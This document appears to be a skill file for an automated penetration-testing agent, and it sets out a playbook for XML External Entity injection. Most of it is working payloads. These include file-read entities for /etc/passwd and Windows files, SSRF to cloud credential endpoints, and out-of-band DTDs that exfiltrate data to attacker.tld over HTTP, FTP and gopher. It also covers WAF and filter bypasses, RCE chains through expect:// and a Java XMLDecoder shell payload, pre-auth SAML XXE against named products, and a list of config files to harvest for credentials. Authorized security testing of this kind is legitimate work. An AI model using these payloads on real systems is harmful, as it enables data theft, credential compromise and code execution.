---
name: xxe
description: XXE testing for external entity injection, file disclosure, and SSRF via XML parsers
---

# XXE

XML External Entity injection is a parser-level failure that enables local file reads, SSRF to internal control planes, denial-of-service via entity expansion, and in some stacks, code execution through XInclude/XSLT or language-specific wrappers. Treat every XML input as untrusted until the parser is proven hardened.

## Attack Surface

**Capabilities**
- File disclosure: read server files and configuration
- SSRF: reach metadata services, internal admin panels, service ports
- DoS: entity expansion (billion laughs), external resource amplification

**Injection Surfaces**
- REST/SOAP/SAML/XML-RPC, file uploads (SVG, Office)
- PDF generators, build/report pipelines, config importers

**Transclusion**
- XInclude and XSLT `document()` loading external resources

## High-Value Targets

**File Uploads**
- SVG/MathML, Office (docx/xlsx/ods/odt), XML-based archives
- Android/iOS plist, project config imports

**Protocols**
- SOAP/XML-RPC/WebDAV/SAML (ACS endpoints)
- RSS/Atom feeds, server-side renderers and converters

**Hidden Paths**
- Parameters: "xml", "upload", "import", "transform", "xslt", "xsl", "xinclude"
- Processing-instruction headers

## Detection Channels

### Direct

- Inline disclosure of entity content in the HTTP response, transformed output, or error pages

### Error-Based

- Coerce parser errors that leak path fragments or file content via interpolated messages

### OAST

- Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)

### Timing

- Fetch slow or unroutable resources to produce measurable latency differences (connect vs read timeouts)

## Core Payloads

### Local File

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

### SSRF

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI">]>
<r>&xxe;</r>
```

### OOB Parameter Entity

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
```

evil.dtd:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%f;.attacker.tld/'>">
%e; %exfil;
```

## Key Vulnerabilities

### Parameter Entities

- Use parameter entities in the DTD subset to define secondary entities that exfiltrate content
- Works even when general entities are sanitized in the XML tree

### XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

Effective where entity resolution is blocked but XInclude remains enabled in the pipeline.

### XSLT Document

XSLT processors can fetch external resources via `document()`:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-stylesheet PI consumers.

### Protocol Wrappers

- Java: `jar:`, `netdoc:`
- PHP: `php://filter`, `expect://` (when module enabled)
- Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes

## Bypass Techniques

**Encoding Variants**
- UTF-16/UTF-7 declarations, mixed newlines
- CDATA and comments to evade naive filters

**DOCTYPE Variants**
- PUBLIC vs SYSTEM, mixed case `<!DoCtYpE>`
- Internal vs external subsets, multi-DOCTYPE edge handling

**Network Controls**
- If network blocked but filesystem readable, pivot to local file disclosure
- If files blocked but network open, pivot to SSRF/OAST

## Special Contexts

### SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

### SAML

- Assertions are XML-signed, but upstream XML parsers prior to signature verification may still process entities/XInclude
- Test ACS endpoints with minimal probes

### SVG and Renderers

- Inline SVG and server-side SVG→PNG/PDF renderers process XML
- Attempt local file reads via entities/XInclude

### Office Docs

- OOXML (docx/xlsx/pptx) are ZIPs containing XML
- Insert payloads into document.xml, rels, or drawing XML and repackage

## Testing Methodology

1. **Inventory consumers** - Endpoints, upload parsers, background jobs, CLI tools, converters, third-party SDKs
2. **Capability probes** - Does parser accept DOCTYPE? Resolve external entities? Allow network access? Support XInclude/XSLT?
3. **Establish oracle** - Error shape, length/ETag diffs, OAST callbacks
4. **Escalate** - Targeted file/SSRF payloads
5. **Validate parity** - Same parser options must hold across REST, SOAP, SAML, file uploads, and background jobs

## Validation

1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT)
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence
3. Confirm blind channels with OAST and correlate to the triggering request
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths)
5. Bound impact: exact files/data reached or internal targets proven

## False Positives

- DOCTYPE accepted but entities not resolved and no transclusion reachable
- Filters or sandboxes that emit entity strings literally (no IO performed)
- Mocks/stubs that simulate success without network/file access
- XML processed only client-side (no server parse)

## Impact

- Disclosure of credentials/keys/configs, code, and environment secrets
- Access to cloud metadata/token services and internal admin panels
- Denial of service via entity expansion or slow external resources
- Code execution via XSLT/expect:// in insecure stacks

## Pro Tips

1. Prefer OAST first; it is the quietest confirmation in production-like paths
2. When content is sanitized, use error-based and length/ETag diffs
3. Probe XInclude/XSLT; they often remain enabled after entity resolution is disabled
4. Aim SSRF at internal well-known ports (kubelet, Docker, Redis, metadata) before public hosts
5. In uploads, repackage OOXML/SVG rather than standalone XML; many apps parse these implicitly
6. Keep payloads minimal; avoid noisy billion-laughs unless specifically testing DoS
7. Test background processors separately; they often use different parser settings
8. Validate parser options in code/config; do not rely on WAFs to block DOCTYPE
9. Combine with path traversal and deserialization where XML touches downstream systems
10. Document exact parser behavior per stack; defenses must match real libraries and flags

## Summary

XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.


## Additional Techniques — ported from WebSkills (xxe-test)

### Parser default-risk by stack

Whether XXE works depends entirely on the parser and its config. Triage accordingly:

| Stack | Common parser(s) | Default risk |
|-------|------------------|--------------|
| Java | `DocumentBuilderFactory`, `SAXParser`, `XMLInputFactory`, `TransformerFactory`, JAXB | Historically vulnerable by default; XInclude/parameter entities often work |
| PHP | `libxml` (`simplexml_load_*`, `DOMDocument`) | `libxml_disable_entity_loader` mattered pre-PHP 8; `php://filter`/`expect://` are PHP gadgets |
| .NET | `XmlDocument`, `XmlReader`, `XmlTextReader` | Vulnerable when `DtdProcessing=Parse`/`ProhibitDtd=false` on older versions |
| Python | `lxml`, `xml.etree`, `xml.sax` | `lxml` resolves entities/external DTDs by config; `defusedxml` is the fix |
| Ruby | `Nokogiri`, REXML | `Nokogiri` needs `NOENT` to expand; usually safe-by-default — check |
| Go | `encoding/xml` | Does NOT resolve external entities (generally XXE-safe) — note when triaging |

### Highest-yield move: content-type swap to XML

Take any JSON or form endpoint, switch `Content-Type` to `application/xml` (also try `text/xml`, `application/soap+xml`, `application/*+xml`) and send an equivalent XML body with an injected DOCTYPE. Many frameworks (Jackson XML, Spring, ASP.NET) will parse it even though the documented content-type was JSON:

```http
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY cat "Tom"> ]>
<user><name>&cat;</name></user>
```
Start with a benign reflected entity (`Tom`) to prove entity expansion before escalating.

### Error-based XXE (no OOB channel)

When there is no reflection and no outbound network, leak file contents inside a parser error. Host this as your external DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
The parser tries to open `file:///nonexistent/<contents>` and echoes the failed path — including the file content — in its error message. Note: `&#x25;` is the hex ref for `%`, required so the inner entity is declared at parse time, not when the DTD is first read.

### CDATA wrapper for multi-line / XML-breaking files

Multi-line files or files containing `<`/`&` corrupt inline substitution. Wrap them in CDATA via an external DTD:

Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/WEB-INF/web.xml">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://attacker:8000/wrapper.dtd">
%dtd;
]>
```
`wrapper.dtd`:
```xml
<!ENTITY wrapper "%start;%file;%end;">
```
(For PHP source, prefer `php://filter/read=convert.base64-encode/resource=...` — base64 is XML-safe.)

### Filter-bypass catalogue (pick by what's blocked)

- **`SYSTEM` blocked** → use `PUBLIC`: `<!ENTITY xxe PUBLIC "id" "file:///etc/passwd">`
- **`ENTITY` keyword blocked** → case (`<!EnTiTy>`), or numeric/hex char refs for the letters: `<!&#69;&#78;&#84;&#73;&#84;&#89; xxe SYSTEM "...">`
- **Keyword string filters** → split with a comment: `<!EN<!-- -->TITY ...>`
- **URI inspected** → smuggle it as base64 via `data://`: `<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;` (decodes to `file:///etc/passwd`)
- **Byte-signature WAF** → change document `encoding=` to UTF-7 / UTF-16 / UTF-32 (with BOM); many upstream filters don't decode it but the parser does.

Recommended order: PUBLIC-vs-SYSTEM → parameter entities → external-DTD chaining → mixed case → numeric/hex char refs → `data:`/base64 → UTF-7 → UTF-16/32 → comment-splitting → double encoding.

### XXE → RCE chains

| Path | Requirement | Trigger |
|------|-------------|---------|
| Log poisoning | Log readable via `file://` AND executed in a code context (usually needs an LFI include sink) | Inject `<?php ...?>` into a logged field, read+execute the log |
| SSRF → creds | XXE→SSRF reaches AWS metadata / internal CI | Read `169.254.169.254/.../security-credentials/ROLE` → IAM creds → SSM/RunCommand |
| Java deserialization | XML deserialized into objects (`XMLDecoder`, `XStream`) | See payload below |
| PHP `expect://` | `expect` extension loaded | `<!ENTITY xxe SYSTEM "expect://id">` |
| Shellshock | Vulnerable Bash reachable via CGI over XXE-driven SSRF | `() { :; };` payload in header to internal CGI |
| OOB delivery | Confirmed outbound + a second-stage sink | External DTD returns a deserialization gadget |

Java `XMLDecoder` RCE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="1">
      <void index="0"><string>/bin/sh -c id</string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```


## Additional Techniques — ported from WebSkills (writeup-techniques/xxe)

Corpus-derived exfil channels, offline primitives, and framework bypasses that go beyond the parser table, content-type swap, error-based, CDATA, filter catalogue, and RCE chains already documented above. All additive.

### Minimal two-stage external DTD (body references remote DTD only)

Where the body is size-limited or only `SYSTEM` on the DOCTYPE is allowed, the document does nothing but pull a remote DTD that carries the entity logic — no parameter-entity block inside the local subset:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://172.17.85.67:5555/mydtd.dtd">
```
```xml
<!DOCTYPE foo SYSTEM "http://<attacker>/a.dtd">
```
The remote DTD then declares the general entity the body references (e.g. `<foo>&e1;</foo>` with `a.dtd` defining `e1`).

### Local DTD reuse — fully offline error-based leak (no outbound network)

When even a remote DTD can't be fetched (egress blocked), import a DTD **already present on the target filesystem** and redefine one of the parameter entities it already declares, building the error-based primitive entirely locally. Reuse an existing name (here `ISOamso` from `docbookx.dtd`) so the redefinition is legal:

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval; &#x25;error;
  '>
  %local_dtd;
]>
```
The parse error for `file:///nonexistent/<contents>` echoes the file back. Works with egress fully filtered — the only requirement is a readable local DTD whose parameter-entity name you know.

### FTP exfil to bypass Java single-line restriction

Java ≥ 1.7 throws `MalformedURLException` on `\n` and other characters inside an `http://` exfil URL, so HTTP OOB only pulls single-line files (`/etc/issue`). Switch the exfil channel to **FTP** (run a fake FTP server) to retrieve multi-line files like `/etc/passwd`:

```
<!ENTITY %% all "<!ENTITY &#37; send SYSTEM "ftp://%(ip)s:%(port)s/%%loot;">">
```
Use `/etc/issue` for a quick single-line HTTP PoC, then move to FTP for the full read.

### Gopher raw-TCP exfil of the read file

Chain a parameter entity into a `gopher://` URL to smuggle the read bytes to an internal (or attacker) service over raw TCP — an exfil channel distinct from issuing Redis/FCGI commands:

```
<!ENTITY % payl SYSTEM "file:///#{params[:f]}">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'gopher://#{request.host}:1337/?%payl;'>">
```

### PHP-FPM re-enables XXE despite `libxml_disable_entity_loader()`

Zend Framework calls `libxml_disable_entity_loader()` then rejects `XML_DOCUMENT_TYPE_NODE` — but under **PHP-FPM** that control is bypassable, re-enabling XXE in `Zend_XmlRpc_Server` / `Zend_Feed` / `Zend_Config_Xml` (eBay Magento CE ≤ 1.9.2.1 / EE ≤ 1.14.2.1, Zend Framework 2.4.2). Impact: file read, SSRF, DoS, or `expect://` RCE. Fingerprint the SAPI before assuming the `disable_entity_loader` mitigation holds.

### Relative-path config read → credential theft → ATO

Entity paths can be relative to the parser's working dir, reaching app config that absolute paths miss. CDATA-wrap the config so XML-unsafe content survives, then harvest credentials for direct login (Zimbra `localconfig.xml` → `zimbra_user` / `zimbra_ldap_password` → admin; AfterLogic WebMail leaked the admin account the same way):

```xml
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
```
Config target bank worth reading once file-read is proven: `conf/localconfig.xml` (Zimbra creds), `web.xml`, `application.properties`, `.env`, `wp-config.php`, `config.php`.

### Windows directory listing via `file:///C:\`

Beyond `win.ini`, point a file entity at a drive/dir root for a **directory listing** on Windows targets:

```xml
<!ENTITY xxe SYSTEM "file:///C:\">
<!ENTITY xxe SYSTEM "file:///c:\Windows\System32\drivers\etc\hosts">
```

### SAML transport — base64+URL-encoded whole-XML, pre-auth

`SAMLResponse` / `SAMLRequest` carry the full XML document base64+URL-encoded; upstream parsers frequently process entities before signature verification, giving **pre-authentication** XXE (CyberArk Enterprise Password Vault `/PasswordVault/auth/saml`, Plesk SSO `/relay`, RSA Authentication Manager). Encode the entire OOB/error payload and submit it as the parameter value:

```
SAMLResponse=<base64(url-encoded XML)>
```
Frame these as Critical: no user interaction, no privileges, triggered pre-auth.
